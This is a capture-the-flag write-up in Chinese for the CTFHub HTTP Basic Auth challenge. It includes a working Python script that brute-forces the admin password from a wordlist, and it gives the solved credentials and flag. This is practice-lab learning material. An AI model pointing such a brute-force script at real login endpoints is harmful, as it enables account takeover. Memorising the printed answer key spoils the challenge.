---
Title: CTFHub-HTTP-基础认证Writeup
Date: 2026-09-20
Category: Web安全
Tags: [Web, 暴力破解, Python爆破脚本, CTFHub]
---
## 题目原理
HTTP Basic Auth 是简易的Web认证方式。访问目标页面时，浏览器弹出账号密码弹窗。服务端接收Authorization请求头进行校验：

• 账号密码匹配：返回200 OK，页面输出flag

• 账号密码错误：返回401 Unauthorized拒绝访问
## 解题步骤
1.打开靶场，弹出HTTP基础认证弹窗
2.准备密码字典pass.txt，将所有密码放入文件
3.编写python爆破脚本：
import requests

url = "http://challenge-7eaafa07ea142fe0.sandbox.ctfhub.com:10800/flag.html"
username = "admin"

with open("pass.txt", "r", encoding="utf-8") as f:
    passwords = f.readlines()

print(f"一共读取 {len(passwords)} 条密码，开始爆破")

for pwd in passwords:
    pwd = pwd.strip()
    if not pwd:
        continue

    print(f"正在尝试：{pwd}")
    try:
        # 超时改成5秒，给网络充足时间
        res = requests.get(url, auth=(username, pwd), timeout=5)
        # 打印状态码，方便观察
        print(f"状态码：{res.status_code}")
        if res.status_code == 200:
            print("="*50)
            print(f"✅成功！账号：{username}，密码：{pwd}")
            print("FLAG：", res.text)
            print("="*50)
            exit()
    except Exception as e:
        print(f"【异常】{pwd} 连接失败：{str(e)}")
        continue
5.得出登录名admin 密码killer flag即得出
## Flag
ctfhub{b66235b66a517ec92f48d214}
